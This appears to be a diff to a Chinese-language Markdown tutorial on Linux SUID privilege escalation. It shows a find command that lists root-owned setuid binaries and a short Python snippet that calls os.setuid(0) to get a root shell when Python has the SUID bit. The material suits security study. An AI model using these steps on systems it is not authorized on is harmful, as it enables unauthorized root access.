@@ -34,9 +34,18 @@ suid全称是Set owner User ID up on execution。这是Linux给可执行文件�
 
 
 
-检测setuid文件
+### 检测setuid文件
 ```
 find / -user root -perm -4000 -print 2>/dev/null
+```
+
+### python
+如果Python具备s标志位并且是root用户，真实环境几乎没有。   
+执行如下：
+```
+import os
+os.setuid(0)
+os.system('whoami')
 ```
 
 
